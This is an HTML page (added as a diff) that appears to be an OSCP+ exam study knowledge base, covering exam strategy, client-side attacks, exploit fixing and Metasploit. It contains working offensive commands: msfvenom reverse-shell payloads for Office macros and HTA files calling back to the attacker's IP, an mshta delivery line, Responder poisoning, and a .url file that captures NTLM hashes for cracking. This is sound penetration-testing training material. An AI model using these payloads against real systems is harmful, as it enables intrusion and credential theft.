@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Syllabus Extras · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">📚 Syllabus Extras</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v9-[beginner-start-here]-you-are-new-read-this-first">[BEGINNER-START-HERE]  (you are new — read this first)</a><a class="navlink lvl1" href="#v9-[exam-day-flow]-the-master-wrapper-open-this-first-on-exam-day">[EXAM-DAY-FLOW]  ⭐ the master wrapper (open this first on exam day)</a><a class="navlink lvl1" href="#v9-[clientside]-client-side-attacks-[phishing]-phishing-modules-1112">[CLIENTSIDE] Client-Side Attacks &amp; [PHISHING] Phishing  (Modules 11–12)</a><a class="navlink lvl2" href="#v9-[clientside-concept]">[CLIENTSIDE-CONCEPT]</a><a class="navlink lvl2" href="#v9-[clientside-ntlm-capture]-highest-value-feeds-ad-roastingrelay">[CLIENTSIDE-NTLM-CAPTURE]  (highest value — feeds AD roasting/relay)</a><a class="navlink lvl2" href="#v9-[clientside-macro]-malicious-office-macro-vba">[CLIENTSIDE-MACRO]  malicious Office macro (VBA)</a><a class="navlink lvl2" href="#v9-[clientside-hta]-html-application">[CLIENTSIDE-HTA]  HTML Application</a><a class="navlink lvl2" href="#v9-[clientside-library-webdav]-windows-library-webdav-pen-200-technique">[CLIENTSIDE-LIBRARY-WEBDAV]  Windows Library + WebDAV (PEN-200 technique)</a><a class="navlink lvl1" href="#v9-[fixing-exploits]-module-14-expands-[exploit-research]">[FIXING-EXPLOITS]  (Module 14 — expands [EXPLOIT-RESEARCH])</a><a class="navlink lvl2" href="#v9-[fixing-compile]-compiling-exploits">[FIXING-COMPILE]  compiling exploits</a><a class="navlink lvl2" href="#v9-[fixing-python]-python-2-3-breakage">[FIXING-PYTHON]  Python 2 → 3 breakage</a><a class="navlink lvl2" href="#v9-[fixing-badchars-shellcode]-patch-the-payload">[FIXING-BADCHARS-SHELLCODE]  patch the payload</a><a class="navlink lvl2" href="#v9-[fixing-checklist]-before-you-run-anything">[FIXING-CHECKLIST]  before you run anything</a><a class="navlink lvl1" href="#v9-[av-evasion]-antivirus-evasion-module-15">[AV-EVASION]  Antivirus Evasion  (Module 15)</a><a class="navlink lvl2" href="#v9-[av-concept]">[AV-CONCEPT]</a><a class="navlink lvl2" href="#v9-[av-practical]">[AV-PRACTICAL]</a><a class="navlink lvl1" href="#v9-[tool-msf]-the-metasploit-framework-module-21">[TOOL-MSF]  The Metasploit Framework  (Module 21)</a><a class="navlink lvl2" href="#v9-[msf-quick]">[MSF-QUICK]</a><a class="navlink lvl2" href="#v9-[msf-handler]-catch-a-manual-payload-multihandler">[MSF-HANDLER]  catch a manual payload (multi/handler)</a><a class="navlink lvl2" href="#v9-[msf-msfvenom]-payload-generation-usable-broadly-for-shells">[MSF-MSFVENOM]  payload generation (usable broadly for shells)</a><a class="navlink lvl2" href="#v9-[msf-meterpreter]-common-commands">[MSF-METERPRETER]  common commands</a><a class="navlink lvl1" href="#v9-[dpi-tunneling]-tunneling-through-deep-packet-inspection-module-20-extends-[pivot-]">[DPI-TUNNELING]  Tunneling Through Deep Packet Inspection  (Module 20 — extends [PIVOT-*])</a><a class="navlink lvl1" href="#v9-[cloud-aws]-aws-cloud-modules-2526-2931">[CLOUD-AWS]  AWS Cloud (Modules 25–26, 29–31)</a><a class="navlink lvl2" href="#v9-[cloud-aws-quick]-awareness-level">[CLOUD-AWS-QUICK]  (awareness level)</a><a class="navlink lvl1" href="#v9-[syllabus-map]-pen-200-module-kb-coverage-full">[SYLLABUS-MAP]  PEN-200 module → KB coverage (full)</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v9-oscp-knowledge-base-volume-7">OSCP+ KNOWLEDGE BASE — VOLUME 7</div>
+<h2 id="v9-syllabus-completion-exam-day-flow-beginner-path">SYLLABUS COMPLETION + EXAM-DAY FLOW + BEGINNER PATH<a class="anchor" href="#v9-syllabus-completion-exam-day-flow-beginner-path">#</a></h2>
+<h3 id="v9-client-side-phishing-fixing-exploits-av-evasion-metasploit-dpi-tunneling-cloud-course-only-exam-day-flow-syllabus-map">Client-Side &amp; Phishing · Fixing Exploits · AV Evasion · Metasploit · DPI Tunneling · Cloud (course-only) · Exam-Day Flow · Syllabus Map<a class="anchor" href="#v9-client-side-phishing-fixing-exploits-av-evasion-metasploit-dpi-tunneling-cloud-course-only-exam-day-flow-syllabus-map">#</a></h3>
+<blockquote>This volume closes the remaining PEN-200 syllabus modules and adds the wrapper that ties all volumes together. Exam-relevance is labelled honestly so a beginner knows where to spend time. <code>$IP</code>=your Kali VPN IP (tun0). <code>$T</code>=target.</blockquote>
+<hr>
+<h1 id="v9-[beginner-start-here]-you-are-new-read-this-first">[BEGINNER-START-HERE]  (you are new — read this first)<a class="anchor" href="#v9-[beginner-start-here]-you-are-new-read-this-first">#</a></h1>
+<p><strong>The exam is 80% enumeration + decision-making, not exploit memorization.</strong> Your job is to build reflexes on machines, using this KB as the &quot;what do I check next&quot; copilot.</p>
+<p><strong>Learning order (map PEN-200 modules → what to actually DO):</strong></p>
+<ol>
+<li><strong>Get comfortable:</strong> Kali, bash, <code>nmap</code>, <code>curl</code>, file transfer (<code class="tag">[FILETRANSFER-QUICK]</code>), shells (<code class="tag">[SHELL-QUICK]</code>). Drill until automatic.</li>
+<li><strong>Enumeration reflexes</strong> (Vol 1): run the <code class="tag">[NMAP-QUICK]</code> two-step + per-service <code>[ENUM-*]</code> on 10+ easy boxes.</li>
+<li><strong>Web + SQLi</strong> (Vol 2): the most common foothold. Practice <code class="tag">[WEB-QUICK]</code> → <code class="tag">[WEB-LFI]</code>/<code class="tag">[WEB-UPLOAD]</code>/<code class="tag">[SQLI]</code>.</li>
+<li><strong>Foothold + exploits</strong> (Vol 3): <code class="tag">[FOOTHOLD-CHECKLIST]</code>, <code class="tag">[EXPLOIT-RESEARCH]</code>, <code class="tag">[FIXING-EXPLOITS]</code>.</li>
+<li><strong>Privilege escalation</strong> (Vol 4): Linux + Windows. Top ~15 vectors each cover most boxes.</li>
+<li><strong>Pivoting</strong> (Vol 5): <code class="tag">[PIVOT-QUICK]</code> with Ligolo/Chisel until boring.</li>
+<li><strong>Active Directory</strong> (Vol 5): <strong>the 40-point core.</strong> Practice full chains, not single boxes.</li>
+<li><strong>Client-side, AV, Metasploit, Cloud</strong> (this volume): lighter — know them, don&#x27;t over-invest (see relevance labels).</li>
+</ol>
+<p><strong>Then just do boxes</strong> (Proving Grounds Practice, HTB TJ-Null OSCP-like list, OffSec Challenge Labs), taking notes as if reporting. Target ~40–60 boxes, AD-weighted. Read a writeup only *after* you try — the gap between your notes and the writeup is your study list.</p>
+<hr>
+<h1 id="v9-[exam-day-flow]-the-master-wrapper-open-this-first-on-exam-day">[EXAM-DAY-FLOW]  ⭐ the master wrapper (open this first on exam day)<a class="anchor" href="#v9-[exam-day-flow]-the-master-wrapper-open-this-first-on-exam-day">#</a></h1>
+<p><strong>One-line model:</strong> *Scan everything → AD set first (BloodHound + roasts + spray → path to DC) → standalones on the 30-min rotation → spray every cred everywhere → screenshot proof the instant you get it → stop early to lock down proofs → write the report.*</p>
+<blockquote>⚠️ <strong>No Buffer Overflow box exists in OSCP+.</strong> Old guides say &quot;start with the 25-pt BOF&quot; — ignore that. Center of gravity = the <strong>AD set (40 pts, all-or-nothing)</strong>.</blockquote>
+<h3 id="v9-phase-0-setup-day-before-first-10-min">PHASE 0 — Setup (day before + first 10 min)<a class="anchor" href="#v9-phase-0-setup-day-before-first-10-min">#</a></h3>
+<ul>
+<li>Day before: test VPN/VM/screenshots/notes; pin <code>OSCP-KB.html</code>; pre-make folders:</li>
+</ul>
+<p>  <code>mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}</code></p>
+<ul>
+<li>Start a terminal logger for the report: <code>script -q ~/oscp/session-$(date +%F).log</code></li>
+<li>First 10 min (clock running): connect proctor+VPN, confirm target reachability, <strong>read the control-panel brief</strong> (starting creds, hostnames, domain, which are AD vs standalone) → paste into notes. Open <code class="tag">[MASTER-METHODOLOGY]</code> + <code class="tag">[TIME-MANAGEMENT]</code>.</li>
+</ul>
+<h3 id="v9-phase-1-fire-all-scans-in-parallel-first-2030-min-[nmap-quick]">PHASE 1 — Fire all scans in parallel (first ~20–30 min) → <code class="tag">[NMAP-QUICK]</code><a class="anchor" href="#v9-phase-1-fire-all-scans-in-parallel-first-2030-min-[nmap-quick]">#</a></h3>
+<ul>
+<li>Launch <code>nmap -p- --min-rate 2000 -Pn</code> on <strong>every</strong> target at once (separate tabs). Then <code>-sCV</code> on the ports that return. Backgrounded <code>-sU --top-ports 100</code> on each.</li>
+<li>While scans run, start web enum on any host already showing 80/443. Route each open port via <code class="tag">[ENUM-DECISION]</code>.</li>
+<li>Rule: <strong>enumerate all ports + all web before exploiting anything.</strong></li>
+</ul>
+<h3 id="v9-phase-2-ad-set-first-fresh-brain-hrs-058-[ad-quick]-[ad-attack-path]">PHASE 2 — AD set FIRST (fresh brain, ~hrs 0.5–8) → <code class="tag">[AD-QUICK]</code>, <code class="tag">[AD-ATTACK-PATH]</code><a class="anchor" href="#v9-phase-2-ad-set-first-fresh-brain-hrs-058-[ad-quick]-[ad-attack-path]">#</a></h3>
+<ol>
+<li>Foothold the entry host (web/service/provided cred) → stabilize (<code class="tag">[SHELL-QUICK]</code>).</li>
+<li>Local loot (<code class="tag">[CREDENTIALS-SOURCES]</code>, <code class="tag">[WINDOWS-PRIVESC-QUICK]</code>).</li>
+<li>First domain cred → <code>sudo ntpdate $DC</code> → <strong>BloodHound</strong> (<code class="tag">[AD-BLOODHOUND]</code>) → <strong>Kerberoast</strong> (<code class="tag">[AD-KERBEROAST]</code>) + <strong>AS-REP</strong> (<code class="tag">[AD-ASREP]</code>) → <strong>spray everywhere</strong> (<code class="tag">[CREDENTIALS-QUICK]</code>).</li>
+<li>Follow BloodHound&#x27;s shortest path: crack roast / abuse ACL (<code class="tag">[AD-ACL]</code>) → lateral (<code class="tag">[AD-LATERAL]</code>) → dump creds on each host → repeat.</li>
+<li>Own DC → <code class="tag">[AD-DCSYNC]</code> (<code>secretsdump</code>) → PtH Administrator to DC + member + workstation → read all <code>proof.txt</code>.</li>
+<li>Decision: AD dead-stalled at ~3–4h with zero progress → bank a standalone, return fresh.</li>
+</ol>
+<h3 id="v9-phase-3-standalones-rotate-hrs-816-[master-methodology]">PHASE 3 — Standalones, rotate (~hrs 8–16) → <code class="tag">[MASTER-METHODOLOGY]</code><a class="anchor" href="#v9-phase-3-standalones-rotate-hrs-816-[master-methodology]">#</a></h3>
+<p>Per box: service triage (<code class="tag">[ENUM-DECISION]</code>) → foothold (<code class="tag">[FOOTHOLD-CHECKLIST]</code>) → **screenshot <code>local.txt</code> now** → privesc (<code class="tag">[LINUX-PRIVESC-QUICK]</code>/<code class="tag">[WINDOWS-PRIVESC-QUICK]</code>) → **screenshot <code>proof.txt</code> now**.</p>
+<ul>
+<li><strong>15-min rule:</strong> stuck → re-read scan output. <strong>30-min rule:</strong> no new hypothesis → switch box, note where you stopped. New cred → spray on all boxes.</li>
+<li>Stuck → <code class="tag">[STUCK-PROTOCOL]</code>. Broken → <code class="tag">[TROUBLESHOOTING-QUICK]</code>. Weird box → revert (free).</li>
+</ul>
+<h3 id="v9-phase-4-sleep-mop-up-hrs-1020">PHASE 4 — Sleep + mop-up (~hrs 10–20)<a class="anchor" href="#v9-phase-4-sleep-mop-up-hrs-1020">#</a></h3>
+<p>Sleep ~4–6h (fatigue = tunnel vision). Then re-attack stuck boxes fresh, grab remaining low-priv 10-pointers.</p>
+<ul>
+<li>Passing math: AD 40 + two full standalones 40 = 80 ✅. Or AD 40 + one full 20 + two low-priv 20 = 80 ✅.</li>
+</ul>
+<h3 id="v9-phase-5-proof-lockdown-stop-hacking-hrs-2023-[reporting-checklist]">PHASE 5 — Proof lockdown (STOP hacking ~hrs 20–23) → <code class="tag">[REPORTING-CHECKLIST]</code><a class="anchor" href="#v9-phase-5-proof-lockdown-stop-hacking-hrs-2023-[reporting-checklist]">#</a></h3>
+<p>Every owned host: one screenshot with **flag + <code>whoami</code>/<code>id</code> + <code>ip a</code>/<code>ipconfig</code><strong>. Re-take any missing </strong>now**. Enter every flag in the control panel.</p>
+<h3 id="v9-phase-6-report-next-24h-[reporting]">PHASE 6 — Report (next 24h) → <code class="tag">[REPORTING]</code><a class="anchor" href="#v9-phase-6-report-next-24h-[reporting]">#</a></h3>
+<p>Per host reproducible steps + screenshots + proof. AD: show the full chain + cred flow. Upload in OffSec&#x27;s format before deadline. <strong>No report = no pass.</strong></p>
+<hr>
+<h1 id="v9-[clientside]-client-side-attacks-[phishing]-phishing-modules-1112">[CLIENTSIDE] Client-Side Attacks &amp; [PHISHING] Phishing  (Modules 11–12)<a class="anchor" href="#v9-[clientside]-client-side-attacks-[phishing]-phishing-modules-1112">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> ⚠️ *Low–moderate.* The exam usually gives you a starting foothold rather than requiring you to phish a live human. <strong>Recognize these; don&#x27;t over-drill.</strong> Some AD entry hosts simulate a user who &quot;opens&quot; a file — that&#x27;s where these matter. <code class="tag">[GENERAL]</code></p>
+<h2 id="v9-[clientside-concept]">[CLIENTSIDE-CONCEPT]<a class="anchor" href="#v9-[clientside-concept]">#</a></h2>
+<p>Client-side = you deliver a file/link and a <strong>user action</strong> triggers code on *their* machine (not a server exploit). PEN-200 focuses on: <strong>capturing NTLM hashes</strong>, <strong>malicious Office macros</strong>, <strong>HTA applications</strong>, and <strong>Windows Library + WebDAV</strong>.</p>
+<h2 id="v9-[clientside-ntlm-capture]-highest-value-feeds-ad-roastingrelay">[CLIENTSIDE-NTLM-CAPTURE]  (highest value — feeds AD roasting/relay)<a class="anchor" href="#v9-[clientside-ntlm-capture]-highest-value-feeds-ad-roastingrelay">#</a></h2>
+<p>Make a victim&#x27;s machine authenticate to <strong>you</strong>, capture the NetNTLMv2 hash → crack or relay.</p>
+<blockquote>⛔ **EXAM CAVEAT (<code class="tag">[EXAM-RULES-2026]</code>):<strong> Responder </strong>poisoning** (LLMNR/NBNS/WPAD, the <code>-w</code> flag) is <strong>BANNED</strong>. On the exam use <strong>analyze mode</strong> (<code>responder -A -I tun0</code>) or just host an SMB server (<code>impacket-smbserver</code>) — capturing a hash because a file the victim opens authenticates *to your server* is allowed; actively poisoning name resolution is not.</blockquote>
+<pre><code># Start a capture server on Kali (LAB/practice — see exam caveat above):
+sudo responder -I tun0                       # listens LLMNR/NBNS/SMB/HTTP (poisoning = lab only)
+sudo responder -A -I tun0                     # ANALYZE mode (passive) = exam-compliant
+# Deliver a file/link that forces an SMB/WebDAV auth to your IP, e.g.:
+#  - a share/upload with a malicious .scf / .url / .lnk pointing to \\$IP\x
+#  - an email/web link:  file://$IP/x   or   \\$IP\share
+# Captured hash → crack:
+hashcat -m 5600 netntlmv2.txt rockyou.txt</code></pre>
+<p><code>.url</code> example dropped in a writable share (target browses the folder → auth to you):</p>
+<pre><code>[InternetShortcut]
+URL=file://$IP/x
+IconIndex=1
+IconFile=\\$IP\x\icon.ico</code></pre>
+<p><strong>LEADS TO:</strong> NetNTLMv2 → crack → domain creds; or <strong>NTLM relay</strong> (<code>ntlmrelayx</code> to a signing:False host) → command exec. See <code class="tag">[SMB-ATTACK]</code>, <code class="tag">[AD-CREDENTIALS]</code>.</p>
+<h2 id="v9-[clientside-macro]-malicious-office-macro-vba">[CLIENTSIDE-MACRO]  malicious Office macro (VBA)<a class="anchor" href="#v9-[clientside-macro]-malicious-office-macro-vba">#</a></h2>
+<p>When a target is expected to open a document (rare on exam):</p>
+<pre><code># msfvenom can generate VBA:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f vba</code></pre>
+<p>Paste into the document&#x27;s VBA editor (Auto_Open/Document_Open sub). A common OSCP-style VBA drops+runs a payload via PowerShell. Host payload with <code>python3 -m http.server</code>; catch with a listener.</p>
+<h2 id="v9-[clientside-hta]-html-application">[CLIENTSIDE-HTA]  HTML Application<a class="anchor" href="#v9-[clientside-hta]-html-application">#</a></h2>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o evil.hta
+# victim runs:  mshta http://$IP/evil.hta</code></pre>
+<h2 id="v9-[clientside-library-webdav]-windows-library-webdav-pen-200-technique">[CLIENTSIDE-LIBRARY-WEBDAV]  Windows Library + WebDAV (PEN-200 technique)<a class="anchor" href="#v9-[clientside-library-webdav]-windows-library-webdav-pen-200-technique">#</a></h2>
+<p>Host a WebDAV share (<code>wsgidav</code>/<code>impacket</code>), craft a <code>.Library-ms</code> + shortcut that points at your WebDAV, deliver it; when opened it lists your share and runs your payload. <code class="tag">[LOOK-UP]</code> (uncommon on exam — recognize only).</p>
+<p><strong>TROUBLESHOOT:</strong> payload caught by AV → see <code class="tag">[AV-EVASION]</code>; hash not cracking → try relay instead.</p>
+<hr>
+<h1 id="v9-[fixing-exploits]-module-14-expands-[exploit-research]">[FIXING-EXPLOITS]  (Module 14 — expands <code class="tag">[EXPLOIT-RESEARCH]</code>)<a class="anchor" href="#v9-[fixing-exploits]-module-14-expands-[exploit-research]">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> ✅ *Moderate–high.* You WILL need to compile/patch a public exploit. <code class="tag">[GENERAL]</code></p>
+<h2 id="v9-[fixing-compile]-compiling-exploits">[FIXING-COMPILE]  compiling exploits<a class="anchor" href="#v9-[fixing-compile]-compiling-exploits">#</a></h2>
+<pre><code># Linux C exploit:
+gcc exploit.c -o exploit                 # add -m32 for 32-bit, -static if libc mismatch
+# Windows exe from Kali (cross-compile with mingw):
+sudo apt install -y mingw-w64                           # if the compilers below are missing (usually preinstalled)
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe        # 64-bit
+i686-w64-mingw32-gcc  exploit.c -o exploit.exe         # 32-bit
+# 32-bit LINUX exploit on 64-bit Kali needs multilib:  sudo apt install gcc-multilib  →  gcc -m32 exploit.c -o exploit
+# Windows privesc PoCs often need Visual Studio — check for a precompiled release on the repo first.</code></pre>
+<h2 id="v9-[fixing-python]-python-2-3-breakage">[FIXING-PYTHON]  Python 2 → 3 breakage<a class="anchor" href="#v9-[fixing-python]-python-2-3-breakage">#</a></h2>
+<ul>
+<li><code>print x</code> → <code>print(x)</code>. <code>urllib2</code> → <code>urllib.request</code>. <code>socket.send(&quot;x&quot;)</code> → <code>.send(b&quot;x&quot;)</code> (bytes).</li>
+<li>Run with the intended interpreter: <code>python2 exploit.py</code> (install if needed) vs <code>python3</code>.</li>
+</ul>
+<h2 id="v9-[fixing-badchars-shellcode]-patch-the-payload">[FIXING-BADCHARS-SHELLCODE]  patch the payload<a class="anchor" href="#v9-[fixing-badchars-shellcode]-patch-the-payload">#</a></h2>
+<ul>
+<li><strong>Bad characters:</strong> many exploits mangle if shellcode contains <code>\x00 \x0a \x0d</code> etc. Regenerate excluding them:</li>
+</ul>
+<p>  <code>msfvenom -p ... -b &#x27;\x00\x0a\x0d&#x27; -f c LHOST=$IP LPORT=443</code></p>
+<ul>
+<li><strong>Replace hardcoded values:</strong> set the exploit&#x27;s <code>LHOST</code>/<code>LPORT</code>/<code>RHOST</code>, target IP, and any offset/return address to match your case.</li>
+<li><strong>Regenerate embedded shellcode:</strong> produce new shellcode with msfvenom in the format the PoC expects (<code>-f python/c/ps1</code>), paste it in, keep the variable name/length assumptions consistent.</li>
+<li><strong>Architecture:</strong> x86 vs x64 must match the target process.</li>
+</ul>
+<h2 id="v9-[fixing-checklist]-before-you-run-anything">[FIXING-CHECKLIST]  before you run anything<a class="anchor" href="#v9-[fixing-checklist]-before-you-run-anything">#</a></h2>
+<pre><code>[ ] Read the whole exploit — what does it do? Any destructive/DoS action? (revert risk)
+[ ] Version + arch + auth requirement match the target exactly?
+[ ] LHOST=tun0 IP, LPORT set, target IP/port correct
+[ ] Interpreter/deps present (python2? ruby? gcc/mingw?)
+[ ] Shellcode has no bad chars; regenerated for your listener
+[ ] Not malware masquerading as a PoC (unknown network calls = suspicious)</code></pre>
+<hr>
